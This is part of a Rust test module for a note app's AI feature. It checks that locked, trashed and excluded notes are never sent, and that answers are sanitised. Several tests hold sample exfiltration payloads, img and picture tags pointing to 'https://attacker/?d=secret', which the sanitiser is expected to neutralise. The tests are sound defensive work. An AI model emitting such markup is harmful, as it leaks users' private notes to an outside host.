        move |_ctx: (), args: ReadArgs| {
            let store = read_store.clone();
            let used = read_used.clone();
            let room = read_room.clone();
            async move {
                match read_note(&store, &args.id, &used) {
                    Ok(Some(excerpt)) => {
                        let excerpt = clamp_excerpts(vec![excerpt], &room)
                            .pop()
                            .expect("one note");
                        Ok(serde_json::json!({
                            "found": true,
                            "id": excerpt.id,
                            "title": excerpt.title,
                            "text": excerpt.text,
                        }))
                    }
                    Ok(None) => Ok(serde_json::json!({
                        "found": false,
                        "error": "not found",
                    })),
                    Err(_) => Ok(serde_json::json!({
                        "found": false,
                        "error": "not found",
                    })),
                }
            }
        },
    ));
    registry
}

#[cfg(test)]
mod tests {
    use super::{
        Candidate, MAX_NOTES, best_text, clamp_excerpts, eligible, fuse, is_exclude_tag, linkify,
        note_is_eligible, passage_around, question_terms, read_note, retrieve, sanitize_answer,
        search_notes, select, stream_answer, strip_remote_images, tool_registry,
    };
    use kanso_ai::{AiError, ChatProvider, Event, Excerpt, Prompt, ToolRegistry};
    use kanso_core::DocType;
    use kanso_store::{Embedder, MeaningSearch, Origin, Put, Store};
    use proptest::prelude::*;
    use proptest::test_runner::FileFailurePersistence;
    use serde_json::json;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Arc, Mutex};

    fn candidate(id: &str, body: &str, tags: &[&str], locked: bool, trashed: bool) -> Candidate {
        Candidate {
            id: id.to_owned(),
            title: id.to_owned(),
            body: body.to_owned(),
            tags: tags.iter().map(|tag| (*tag).to_owned()).collect(),
            locked,
            trashed,
            meaning: None,
        }
    }

    /// The IDs the exclusions leave, for a property's expectation.
    fn available_ids(candidates: &[Candidate]) -> Vec<&str> {
        candidates
            .iter()
            .filter(|candidate| eligible(candidate))
            .map(|candidate| candidate.id.as_str())
            .collect()
    }

    #[test]
    fn the_exclusion_tag_is_written_any_way() {
        for tag in ["ai-exclude", "#ai-exclude", " AI-EXCLUDE ", "AI-Exclude"] {
            assert!(is_exclude_tag(tag), "{tag}");
        }
        for tag in ["ai", "exclude", "ai-excluded", "notes"] {
            assert!(!is_exclude_tag(tag), "{tag}");
        }
    }

    #[test]
    fn questions_lose_their_common_words() {
        assert_eq!(
            question_terms("What did we decide about the pricing in May?"),
            ["decide", "pricing", "may"]
        );
        assert_eq!(question_terms("is it?"), ["is it?"]);
        assert!(question_terms("").is_empty());
        // Question verbs and the word "notes" say nothing about relevance.
        assert_eq!(
            question_terms("Tell me what you remember and write the notes about pricing"),
            ["pricing"]
        );
    }

    #[test]
    fn whole_words_do_not_match_inside_other_words() {
        assert_eq!(super::word_count("the planet is blue", "plan"), 0);
        assert_eq!(super::word_count("our plan is ready", "plan"), 1);
        assert_eq!(super::word_count("plans and planning", "plan"), 1);
        assert_eq!(super::word_count("the planets are far", "plan"), 0);
        assert_eq!(super::word_count("café plan", "plan"), 1);
    }

    #[test]
    fn fusion_prefers_a_note_in_several_lists() {
        let merged = fuse(
            &[
                vec!["note:a".into(), "note:b".into()],
                vec!["note:b".into(), "note:c".into()],
            ],
            3,
        );
        assert_eq!(merged, ["note:b", "note:a", "note:c"]);
    }

    #[test]
    fn the_matching_passage_comes_before_the_opening() {
        let text = best_text(
            "A note about the garden.\n\nWe chose the blue paint for the kitchen.",
            &["paint".to_owned()],
            400,
        );
        assert!(text.starts_with("We chose the blue paint"));
    }

    #[test]
    fn a_note_with_no_matching_passage_gives_nothing() {
        assert_eq!(
            best_text("A note about the garden.", &["paint".to_owned()], 400),
            ""
        );
    }

    #[test]
    fn one_incidental_word_is_not_enough() {
        let candidates = vec![
            Candidate {
                id: "note:pricing".into(),
                title: "Pricing".into(),
                body: "The yearly plan costs 40 dollars.".into(),
                tags: vec![],
                locked: false,
                trashed: false,
                meaning: None,
            },
            Candidate {
                id: "note:planet".into(),
                title: "Planet".into(),
                body: "Mars is the fourth planet.".into(),
                tags: vec![],
                locked: false,
                trashed: false,
                meaning: None,
            },
        ];
        let chosen = select(
            "What did we decide about pricing and plans?",
            &candidates,
            8,
            20_000,
        );
        assert_eq!(chosen.len(), 1);
        assert_eq!(chosen[0].id, "note:pricing");
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: 128,
            failure_persistence: Some(Box::new(FileFailurePersistence::WithSource("regressions"))),
            ..ProptestConfig::default()
        })]

        /// Whatever the notes and their flags, a locked, trashed or
        /// `#ai-exclude` note is never in what a question sends.
        #[test]
        fn prop_excluded_notes_are_never_sent(
            question in "\\PC{0,80}",
            rows in prop::collection::vec(
                ("note:[a-z]{1,6}", "\\PC{0,300}", any::<bool>(), any::<bool>(), any::<bool>()),
                0..14,
            ),
        ) {
            let candidates: Vec<Candidate> = rows
                .iter()
                .map(|(id, body, locked, trashed, exclude)| Candidate {
                    id: id.clone(),
                    title: id.clone(),
                    body: body.clone(),
                    tags: if *exclude { vec!["ai-exclude".to_owned()] } else { vec![] },
                    locked: *locked,
                    trashed: *trashed,
                    meaning: None,
                })
                .collect();
            let chosen = select(&question, &candidates, 8, 20_000);
            let allowed = available_ids(&candidates);
            for excerpt in &chosen {
                prop_assert!(allowed.contains(&excerpt.id.as_str()), "{} was sent", excerpt.id);
            }
            for (candidate, (_, _, locked, trashed, exclude)) in candidates.iter().zip(&rows) {
                if *locked || *trashed || *exclude {
                    prop_assert!(!chosen.iter().any(|excerpt| excerpt.id == candidate.id));
                }
            }
        }

        /// Every excerpt fits the budget, is labelled with its note, and
        /// comes from its own note's words.
        #[test]
        fn prop_every_excerpt_is_labeled_and_inside_the_budget(
            question in "\\PC{0,80}",
            rows in prop::collection::vec(("note:[a-z]{1,6}", "\\PC{0,500}"), 0..10),
            budget in 500usize..30_000,
        ) {
            let candidates: Vec<Candidate> = rows
                .iter()
                .map(|(id, body)| candidate(id, body, &[], false, false))
                .collect();
            let chosen = select(&question, &candidates, 8, budget);
            let total: usize = chosen.iter().map(|excerpt| excerpt.text.chars().count()).sum();
            prop_assert!(total <= budget);
            for excerpt in &chosen {
                let candidate = candidates.iter().find(|c| c.id == excerpt.id).unwrap();
                prop_assert_eq!(&excerpt.title, &candidate.title);
                prop_assert!(!excerpt.text.trim().is_empty());
                prop_assert!(!excerpt.id.is_empty());
            }
        }
    }

    fn open() -> (tempfile::TempDir, Store) {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::open(dir.path().join("kanso.db")).unwrap();
        (dir, store)
    }

    fn book(store: &Store, name: &str, parent: Option<&str>, locked: bool) -> String {
        let mut fields = json!({"name": name});
        if let Some(parent) = parent {
            fields["parentBookId"] = json!(parent);
        }
        if locked {
            fields["kansoLock"] = json!({"salt": "abc"});
        }
        store
            .put(DocType::Book, fields, Put::Upsert, Origin::Ui)
            .unwrap()
            .id
    }

    fn note(store: &Store, title: &str, body: &str, tags: Vec<String>) -> String {
        note_in(store, title, body, tags, None)
    }

    fn note_in(
        store: &Store,
        title: &str,
        body: &str,
        tags: Vec<String>,
        book: Option<&str>,
    ) -> String {
        let book = book.map(str::to_owned).unwrap_or_else(|| {
            store
                .put(
                    DocType::Book,
                    json!({"name": "Notes"}),
                    Put::Upsert,
                    Origin::Ui,
                )
                .unwrap()
                .id
        });
        store
            .put(
                DocType::Note,
                json!({"title": title, "body": body, "bookId": book, "tags": tags}),
                Put::Upsert,
                Origin::Ui,
            )
            .unwrap()
            .id
    }

    /// A provider that says what it was given, without a network.
    struct Fake {
        events: Vec<Event>,
    }

    impl ChatProvider for Fake {
        fn stream(&self, _: &Prompt) -> Result<Box<dyn Iterator<Item = Event> + Send>, AiError> {
            Ok(Box::new(self.events.clone().into_iter()))
        }
    }

    #[test]
    fn an_answer_streams_in_and_stops_at_done() {
        let provider = Fake {
            events: vec![
                Event::Text("Your ".into()),
                Event::Text("notes.".into()),
                Event::Done,
                Event::Text(" Not this.".into()),
            ],
        };
        let prompt = Prompt {
            system: String::new(),
            user: String::new(),
        };
        let mut said = String::new();
        stream_answer(
            &provider,
            &prompt,
            &[],
            ToolRegistry::new(),
            Box::new(|| {}),
            &Arc::new(AtomicBool::new(false)),
            |event| {
                if let Event::Text(text) = event {
                    said.push_str(&text);
                }
            },
        );
        assert_eq!(said, "Your notes.");
    }

    #[test]
    fn cancelling_stops_the_answer() {
        let provider = Fake {
            events: vec![
                Event::Text("one".into()),
                Event::Text("two".into()),
                Event::Done,
            ],
        };
        let prompt = Prompt {
            system: String::new(),
            user: String::new(),
        };
        let cancel = Arc::new(AtomicBool::new(false));
        let mut said = String::new();
        stream_answer(
            &provider,
            &prompt,
            &[],
            ToolRegistry::new(),
            Box::new(|| {}),
            &cancel,
            |event| {
                if let Event::Text(text) = event {
                    said.push_str(&text);
                    cancel.store(true, Ordering::Relaxed);
                }
            },
        );
        assert_eq!(said, "one");
    }

    #[test]
    fn a_provider_error_is_the_last_event() {
        let provider = Fake {
            events: vec![Event::Error("offline".into()), Event::Text("late".into())],
        };
        let prompt = Prompt {
            system: String::new(),
            user: String::new(),
        };
        let mut events = Vec::new();
        stream_answer(
            &provider,
            &prompt,
            &[],
            ToolRegistry::new(),
            Box::new(|| {}),
            &Arc::new(AtomicBool::new(false)),
            |event| events.push(event),
        );
        assert_eq!(events, [Event::Error("offline".into())]);
    }

    #[test]
    fn a_cited_note_becomes_a_link_to_it() {
        let used = vec![
            excerpt_for("Pricing", "The yearly plan is 40 dollars."),
            excerpt_for("Launch", "It starts in May."),
        ];
        assert_eq!(
            linkify("See [[Pricing]] and [[Launch]].", &used),
            "See [Pricing](inkdrop://note/pricing) and [Launch](inkdrop://note/launch)."
        );
        assert_eq!(
            linkify("See [[Someone else's note]].", &used),
            "See [[Someone else's note]]."
        );
    }

    fn excerpt_for(title: &str, text: &str) -> Excerpt {
        Excerpt {
            id: format!("note:{}", title.to_lowercase()),
            title: title.to_owned(),
            text: text.to_owned(),
        }
    }

    proptest! {
        /// A cited title links to the note it names, and a title no excerpt
        /// has is left as it was. Linking an already linked answer changes
        /// nothing.
        #[test]
        fn prop_linkify_links_only_known_titles(
            before in "[^\\[\\]]{0,80}",
            after in "[^\\[\\]]{0,80}",
            title in "[A-Za-z][A-Za-z ]{0,20}",
            unknown in "[A-Za-z][A-Za-z ]{0,20}",
        ) {
            prop_assume!(title.trim() != unknown.trim());
            let used = vec![excerpt_for(&title, "words")];
            let answer = format!("{before}[[{title}]]{after}[[{unknown}]]");
            let linked = linkify(&answer, &used);
            let id = title.to_lowercase();
            let linked_title = format!("[{}](inkdrop://note/{id})", title.trim());
            let unknown_title = format!("[[{unknown}]]");
            prop_assert!(linked.contains(&linked_title));
            prop_assert!(linked.contains(&unknown_title));
            prop_assert_eq!(linkify(&linked, &used), linked.clone());
            if !answer.contains("[[") {
                prop_assert_eq!(linked, answer);
            }
        }
    }

    #[test]
    fn a_locked_note_is_never_read_for_a_question() {
        let (_dir, store) = open();
        let locked = note(
            &store,
            "Secret pricing",
            "The secret pricing is 99.",
            vec![],
        );
        store
            .put(
                DocType::Note,
                json!({"_id": locked, "kansoLock": {"salt": "abc"}}),
                Put::Merge,
                Origin::Sync,
            )
            .unwrap();
        let found = retrieve(&store, "What is the secret pricing?").unwrap();
        assert!(found.iter().all(|excerpt| excerpt.id != locked));
        // The note is still there, still locked: nothing was changed.
        assert!(store.note_is_locked(&locked).unwrap());
        // And the store's own search does find it, so the test above is not
        // passing because search missed it.
        let params = kanso_store::SearchParams {
            query: kanso_core::Query {
                clauses: vec![kanso_core::query::Clause::text("secret")],
            },
            limit: Some(10),
            ..kanso_store::SearchParams::default()
        };
        assert!(
            store
                .search(&params)
                .unwrap()
                .iter()
                .any(|doc| doc.id == locked)
        );
    }

    #[test]
    fn retrieval_finds_a_note_and_leaves_out_the_excluded() {
        let (_dir, store) = open();
        let kept = note(
            &store,
            "Pricing",
            "We decided the yearly plan costs 40 dollars.",
            vec![],
        );
        let excluded_tag = store
            .put(
                DocType::Tag,
                json!({"name": "ai-exclude"}),
                Put::Upsert,
                Origin::Ui,
            )
            .unwrap()
            .id;
        note(
            &store,
            "Secret pricing",
            "The pricing is elsewhere.",
            vec![excluded_tag],
        );
        let trashed = note(&store, "Old pricing", "The old pricing.", vec![]);
        store.delete(&trashed, Origin::Ui).unwrap();
        let found = retrieve(&store, "What did we decide about pricing?").unwrap();
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].id, kept);
        assert!(found[0].text.contains("yearly plan"));
        assert!(
            retrieve(&store, "Where are the car keys?")
                .unwrap()
                .is_empty()
        );
    }

    #[test]
    fn unrelated_notes_are_never_sent() {
        let (_dir, store) = open();
        note(
            &store,
            "Pricing",
            "We decided the yearly plan costs 40 dollars.",
            vec![],
        );
        note(
            &store,
            "Garden",
            "The tomatoes need water every morning.",
            vec![],
        );
        note(
            &store,
            "Car",
            "The car keys are in the hallway drawer.",
            vec![],
        );
        note(
            &store,
            "Roadmap meeting",
            "We met on Tuesday to discuss the roadmap.",
            vec![],
        );
        note(&store, "Planet", "Mars is the fourth planet.", vec![]);

        let tables: &[(&str, &[&str])] = &[
            ("What did we decide about pricing?", &["Pricing"]),
            ("Where are the car keys?", &["Car"]),
            ("When do the tomatoes need water?", &["Garden"]),
            (
                "Tell me what you know about our plans and write the notes",
                &["Pricing"],
            ),
            (
                "What did Sarah say about the roadmap?",
                &["Roadmap meeting"],
            ),
        ];
        for (question, expected) in tables {
            let found = retrieve(&store, question).unwrap();
            let titles: Vec<&str> = found.iter().map(|excerpt| excerpt.title.as_str()).collect();
            assert_eq!(&titles, *expected, "{question}");
        }
        assert!(
            retrieve(&store, "What is the capital of France?")
                .unwrap()
                .is_empty()
        );
    }

    /// Counts letters: notes with the same letters point the same way.
    struct Letters;

    impl Embedder for Letters {
        fn model(&self) -> &str {
            "letters"
        }
        fn dim(&self) -> usize {
            26
        }
        fn embed(&self, texts: &[String]) -> Vec<Vec<f32>> {
            texts
                .iter()
                .map(|text| {
                    let mut vector = vec![0f32; 26];
                    for ch in text.to_lowercase().chars() {
                        if ch.is_ascii_lowercase() {
                            vector[(ch as u8 - b'a') as usize] += 1.;
                        }
                    }
                    vector
                })
                .collect()
        }
    }

    fn embed_all(store: &Store, embedder: &dyn Embedder) {
        let queue = store.embedding_queue(embedder.model()).unwrap();
        let texts: Vec<String> = queue.pending.iter().map(|p| p.text.clone()).collect();
        let vectors = embedder.embed(&texts);
        let rows: Vec<(String, String, Vec<f32>)> = queue
            .pending
            .into_iter()
            .zip(vectors)
            .map(|(pending, vector)| (pending.id, pending.hash, vector))
            .collect();
        store.put_embeddings(embedder.model(), &rows).unwrap();
    }

    #[test]
    fn a_meaning_hit_below_the_floor_is_not_sent() {
        let (_dir, store) = open();
        store.set_embedding_model(Some("letters")).unwrap();
        let embedder = Letters;
        store.lend_embedder(Some(Arc::new(embedder)));
        note(&store, "Garden", "The tomatoes need water.", vec![]);
        embed_all(&store, &Letters);
        // A question with no words in common and different letters: the
        // nearest note is still far below the floor.
        assert!(retrieve(&store, "zzzz").unwrap().is_empty());
        assert!(matches!(
            store.search_by_meaning("zzzz", 20).unwrap(),
            MeaningSearch::Found(found) if found.iter().all(|note| note.score < kanso_store::MEANING_SIMILARITY)
        ));
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: 24,
            failure_persistence: Some(Box::new(FileFailurePersistence::WithSource("regressions"))),
            ..ProptestConfig::default()
        })]

        /// A store with sealed notes, notes in locked and nested locked
        /// notebooks, trashed notes and `#ai-exclude` notes: neither retrieval
        /// nor the tools ever return one, even when meaning search ranks it
        /// first.
        #[test]
        fn prop_store_exclusions_hold_for_retrieval_and_tools(
            cases in prop::collection::vec(0u8..10, 4..10),
        ) {
            let (_dir, store) = open();
            store.set_embedding_model(Some("letters")).unwrap();
            store.lend_embedder(Some(Arc::new(Letters)));
            let locked_book = book(&store, "Locked", None, true);
            let nested_book = book(&store, "Nested", Some(&locked_book), false);
            // The nested notebook is inside the locked one, so its notes are
            // locked by ancestry with no lock field of their own.
            let mut excluded = Vec::new();
            let mut searchable = Vec::new();
            let mut allowed = Vec::new();
            for (ix, kind) in cases.iter().enumerate() {
                let title = format!("zebra note {ix}");
                let body = format!("zebra body {ix} with words");
                let id = match kind % 6 {
                    0 => {
                        let id = note(&store, &title, &body, vec![]);
                        store
                            .put(
                                DocType::Note,
                                json!({"_id": id, "kansoLock": {"salt": "abc"}}),
                                Put::Merge,
                                Origin::Sync,
                            )
                            .unwrap();
                        excluded.push(id.clone());
                        searchable.push(id);
                        continue;
                    }
                    1 => {
                        let id = note_in(&store, &title, "", vec![], Some(&locked_book));
                        store
                            .put(
                                DocType::Note,
                                json!({"_id": id, "kansoLock": {"salt": "abc"}}),
                                Put::Merge,
                                Origin::Sync,
                            )
                            .unwrap();
                        excluded.push(id.clone());
                        searchable.push(id.clone());
                        id
                    }
                    2 => {
                        // An unsealed note inside a locked notebook: only
                        // `in_locked_notebook` protects it, with no lock
                        // field of its own.
                        let id = note_in(&store, &title, "", vec![], Some(&nested_book));
                        excluded.push(id.clone());
                        searchable.push(id.clone());
                        id
                    }
                    3 => {
                        let id = note(&store, &title, &body, vec![]);
                        store.delete(&id, Origin::Ui).unwrap();
                        excluded.push(id);
                        continue;
                    }
                    4 => {
                        let tag = store
                            .put(DocType::Tag, json!({"name": "ai-exclude"}), Put::Upsert, Origin::Ui)
                            .unwrap()
                            .id;
                        let id = note(&store, &title, &body, vec![tag]);
                        excluded.push(id.clone());
                        searchable.push(id.clone());
                        id
                    }
                    _ => {
                        let id = note(&store, &title, &body, vec![]);
                        allowed.push(id.clone());
                        id
                    }
                };
                let _ = id;
            }
            // Embed everything the store can see, including sealed notes
            // (from their title) so meaning search really could rank them.
            embed_all(&store, &Letters);
            // The store's own search really did return each excluded note
            // (except trashed ones, which search never sees), so the filter
            // below is what dropped it.
            let params = kanso_store::SearchParams {
                query: kanso_core::Query {
                    clauses: vec![kanso_core::query::Clause::text("zebra")],
                },
                limit: Some(100),
                ..kanso_store::SearchParams::default()
            };
            let searched: Vec<String> = store
                .search(&params)
                .unwrap()
                .into_iter()
                .map(|doc| doc.id)
                .collect();
            for id in &searchable {
                prop_assert!(searched.contains(id), "{id} never reached the filter");
            }
            let used = Mutex::new(Vec::new());
            let found = retrieve(&store, "zebra").unwrap();
            let tool_found = search_notes(&store, "zebra", &used).unwrap();
            for excerpt in found.iter().chain(tool_found.iter()) {
                prop_assert!(!excluded.contains(&excerpt.id), "{} was exposed", excerpt.id);
                prop_assert!(allowed.contains(&excerpt.id), "{} was not allowed", excerpt.id);
            }
            for id in &excluded {
                prop_assert!(read_note(&store, id, &used).unwrap().is_none(), "{id} was read");
                prop_assert!(!used.lock().unwrap().iter().any(|excerpt| &excerpt.id == id));
            }
            // The property is not vacuous: at least one allowed note is sent
            // when there is one, and store search can see the sealed notes.
            if !allowed.is_empty() {
                prop_assert!(!found.is_empty() || !tool_found.is_empty());
            }
        }
    }

    #[test]
    fn tools_see_only_eligible_notes() {
        let (_dir, store) = open();
        let kept = note(
            &store,
            "Pricing",
            "The yearly plan costs 40 dollars.",
            vec![],
        );
        let sealed = note(
            &store,
            "Secret pricing",
            "The secret pricing is 99.",
            vec![],
        );
        store
            .put(
                DocType::Note,
                json!({"_id": sealed, "kansoLock": {"salt": "abc"}}),
                Put::Merge,
                Origin::Sync,
            )
            .unwrap();
        let used = Mutex::new(Vec::new());
        let results = search_notes(&store, "pricing", &used).unwrap();
        assert!(results.iter().all(|excerpt| excerpt.id != sealed));
        assert!(results.iter().any(|excerpt| excerpt.id == kept));
        assert!(read_note(&store, &sealed, &used).unwrap().is_none());
        assert!(read_note(&store, &kept, &used).unwrap().is_some());
        assert!(
            used.lock()
                .unwrap()
                .iter()
                .any(|excerpt| excerpt.id == kept)
        );
        let _registry = tool_registry(Arc::new(store), Arc::new(Mutex::new(Vec::new())));
    }

    #[test]
    fn the_tool_registry_names_both_tools() {
        let (_dir, store) = open();
        let registry = tool_registry(Arc::new(store), Arc::new(Mutex::new(Vec::new())));
        let names: Vec<String> = registry
            .definitions()
            .into_iter()
            .map(|definition| definition.name)
            .collect();
        assert!(names.contains(&"search_notes".to_owned()));
        assert!(names.contains(&"read_note".to_owned()));
    }

    #[test]
    fn a_question_never_sends_more_than_the_cap() {
        let (_dir, store) = open();
        for ix in 0..20 {
            note(&store, &format!("Plan {ix}"), "the plan for growth", vec![]);
        }
        let found = retrieve(&store, "plan").unwrap();
        assert!(found.len() <= MAX_NOTES);
    }
    /// The image and HTML nodes the view would render for `markdown`.
    fn rendered_markup(markdown: &str) -> (usize, Vec<String>) {
        fn walk(node: &markdown::mdast::Node, images: &mut usize, html: &mut Vec<String>) {
            match node {
                markdown::mdast::Node::Image(_) | markdown::mdast::Node::ImageReference(_) => {
                    *images += 1;
                }
                markdown::mdast::Node::Html(value) => html.push(value.value.clone()),
                _ => {}
            }
            if let Some(children) = node.children() {
                for child in children {
                    walk(child, images, html);
                }
            }
        }
        let root = markdown::to_mdast(markdown, &markdown::ParseOptions::gfm())
            .expect("sanitised Markdown parses");
        let mut images = 0;
        let mut html = Vec::new();
        walk(&root, &mut images, &mut html);
        (images, html)
    }

    #[test]
    fn raw_html_in_an_answer_never_renders() {
        let answers = [
            "Look <img src=\"https://attacker/?d=secret\">",
            "Look <IMG SRC=\"https://attacker/?d=secret\">",
            "Look <img/src=https://attacker/?d=secret>",
            "<picture><source srcset=\"https://attacker/?d=secret 1x\"></picture>",
            "<!-- <img src=\"https://attacker/?d=secret\"> -->",
        ];
        for answer in answers {
            let cleaned = sanitize_answer(answer, &[]);
            let (images, html) = rendered_markup(&cleaned);
            assert_eq!(images, 0, "{answer:?} rendered an image: {cleaned:?}");
            assert!(html.is_empty(), "{answer:?} left HTML: {html:?}");
            // What the panel's parser reads as a tag is escaped; text it
            // doesn't (`<img/src=…>` isn't a tag to it) renders as text.
            assert!(!cleaned.contains("<img "), "{cleaned:?}");
        }
    }

    #[test]
    fn code_in_an_answer_keeps_its_angle_brackets() {
        let answer =
            "Use `Vec<String>` here.\n\n```html\n<div class=\"x\">![a](i.png)</div>\n```\n";
        let cleaned = sanitize_answer(answer, &[]);
        assert_eq!(cleaned, answer, "code is left exactly as written");
        let (images, html) = rendered_markup(&cleaned);
        assert_eq!(images, 0);
        assert!(html.is_empty(), "{html:?}");
    }

    #[test]
    fn markup_hidden_in_unclaimed_math_is_neutralised() {
        let cleaned = sanitize_answer("Cost $<img src=\"https://attacker/?d=x\">$ total", &[]);
        assert!(!cleaned.contains("<img"), "{cleaned}");
    }

    #[test]
    fn a_cited_title_cannot_smuggle_markup() {
        let used = vec![excerpt_for(
            "<img src=\"https://attacker/?d=secret\">",
            "words",
        )];
        let cleaned = sanitize_answer("See [[<img src=\"https://attacker/?d=secret\">]].", &used);
        let (images, html) = rendered_markup(&cleaned);
        assert_eq!(images, 0, "{cleaned}");
        assert!(html.is_empty(), "{html:?}");
        assert!(cleaned.contains("inkdrop://note/"), "{cleaned}");
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: 128,
            failure_persistence: Some(Box::new(FileFailurePersistence::WithSource("regressions"))),
            ..ProptestConfig::default()
        })]

        /// Whatever an answer says, the Markdown Kanso renders has no image
        /// node and no HTML node carrying a source.
        #[test]
        fn prop_no_answer_can_render_an_image_or_html(
            answer in "\\PC{0,500}",
        ) {
            let cleaned = sanitize_answer(&answer, &[]);
            let (images, html) = rendered_markup(&cleaned);
            prop_assert_eq!(images, 0, "{} rendered an image", answer);
            for node in html {
                let lower = node.to_ascii_lowercase();
                prop_assert!(!lower.contains("src") && !lower.contains("srcset"), "{node}");
            }
        }
    }

    #[test]
    fn images_from_the_network_are_never_rendered() {
        assert_eq!(
            strip_remote_images("![a chart](https://example.com/chart.png) Look."),
            " Look."
        );
        assert_eq!(strip_remote_images("![one](http://e/x)![two](//e/y)"), "");
        let local = "![a local chart](data:image/png;base64,AAAA)";
        assert_eq!(strip_remote_images(local), local);
        let link = "see [the site](https://example.com)";
        assert_eq!(strip_remote_images(link), link);
    }

    proptest! {
        /// No answer can make Kanso fetch a remote image, whatever surrounds
        /// it.
        #[test]
        fn prop_remote_images_never_survive(
            before in "[^!\\[]{0,40}",
            host in "[a-z]{1,12}\\.[a-z]{1,6}",
            path in "[a-z0-9/._-]{0,20}",
            after in "[^)\\]]{0,40}",
        ) {
            let answer = format!("{before}![alt](https://{host}/{path}){after}");
            let cleaned = strip_remote_images(&answer);
            prop_assert!(!cleaned.contains("https://"));
            let (images, _) = rendered_markup(&cleaned);
            prop_assert_eq!(images, 0, "{} rendered an image", cleaned);
        }
    }

    #[test]
    fn a_dropped_offset_can_never_split_a_character() {
        // `İ` lowercases to two chars, so a match after it sits at a larger
        // byte offset in the lowercased copy than in the original.
        let passage = format!(
            "{} İstanbul şube {}",
            "dolgu ".repeat(80),
            "son ".repeat(80)
        );
        let out = passage_around(&passage, &["şube".to_owned()], 200);
        assert!(passage.contains(&out));
        assert!(out.contains("şube"), "{out}");

        // The Kelvin sign shrinks when lowercased, so the old offset landed
        // wrongly in the original.
        let passage = format!(
            "\u{212A}elvin ölçü {} hedef {}",
            "dolgu ".repeat(80),
            "son ".repeat(80)
        );
        let out = passage_around(&passage, &["hedef".to_owned()], 200);
        assert!(passage.contains(&out));
        assert!(out.contains("hedef"), "{out}");

        // Capital sharp S shrinks too.
        let passage = format!("ẞtraße {} ziel {}", "dolgu ".repeat(80), "son ".repeat(80));
        let out = passage_around(&passage, &["ziel".to_owned()], 200);
        assert!(passage.contains(&out));
        assert!(out.contains("ziel"), "{out}");
    }

    proptest! {
        #![proptest_config(ProptestConfig {
            cases: 256,
            failure_persistence: Some(Box::new(FileFailurePersistence::WithSource("regressions"))),
            ..ProptestConfig::default()
        })]

        /// Any Unicode passage and term: no panic, and the excerpt is always a
        /// whole-character substring of the passage within its room.
        #[test]
        fn prop_passage_around_never_panics(
            passage in "\\PC{0,600}",
            term in "\\PC{0,24}",
            room in 1usize..300,
        ) {
            let out = passage_around(&passage, &[term], room);
            prop_assert!(out.chars().count() <= room);
            prop_assert!(passage.contains(&out), "{passage:?} -> {out:?}");
        }
    }

    #[test]
    fn a_meaning_only_hit_needs_a_stronger_match_and_sends_only_the_opening() {
        let body = "a".repeat(2000);
        let weak = Candidate {
            id: "note:weak".into(),
            title: "Weak".into(),
            body: body.clone(),
            tags: vec![],
            locked: false,
            trashed: false,
            meaning: Some(0.36),
        };
        assert!(select("zzzz", &[weak], 8, 20_000).is_empty());

        let strong = Candidate {
            id: "note:strong".into(),
            title: "Strong".into(),
            body,
            tags: vec![],
            locked: false,
            trashed: false,
            meaning: Some(0.6),
        };
        let chosen = select("zzzz", &[strong], 8, 20_000);
        assert_eq!(chosen.len(), 1);
        assert_eq!(chosen[0].text.chars().count(), super::MEANING_ONLY_ROOM);
        assert!(chosen[0].text.chars().all(|ch| ch == 'a'));
    }

    #[test]
    fn a_citation_is_ineligible_once_its_note_is_locked() {
        let (_dir, store) = open();
        let id = note(&store, "Pricing", "The yearly plan is 40 dollars.", vec![]);
        assert!(note_is_eligible(&store, &id));
        store
            .put(
                DocType::Note,
                json!({"_id": id, "kansoLock": {"salt": "abc"}}),
                Put::Merge,
                Origin::Sync,
            )
            .unwrap();
        assert!(!note_is_eligible(&store, &id));
    }

    #[test]
    fn a_lock_check_error_fails_closed() {
        let (_dir, store) = open();
        store.set_embedding_model(Some("letters")).unwrap();
        store.lend_embedder(Some(Arc::new(Letters)));
        let id = note(
            &store,
            "Secret pricing",
            "The secret pricing is 99.",
            vec![],
        );
        embed_all(&store, &Letters);
        // Every lock check now errors: the view it reads is gone.
        {
            let conn = rusqlite::Connection::open(store.path()).unwrap();
            conn.execute("DROP VIEW locked_books", []).unwrap();
        }
        // The eligibility decision used by the second retrieval pass (and by
        // follow-up history) treats an error as locked.
        assert!(!note_is_eligible(&store, &id));
        let found = retrieve(&store, "Secret pricing").unwrap_or_default();
        assert!(found.iter().all(|excerpt| excerpt.id != id), "{found:?}");
    }

    #[test]
    fn the_tool_room_is_shared_and_bounded() {
        let room = Mutex::new(10);
        let clamped = clamp_excerpts(
            vec![
                excerpt_for("One", "0123456789abcdef"),
                excerpt_for("Two", "abcdef"),
            ],
            &room,
        );
        assert_eq!(clamped[0].text, "0123456789");
        assert!(clamped[1].text.is_empty());
        assert_eq!(*room.lock().unwrap(), 0);
    }
}
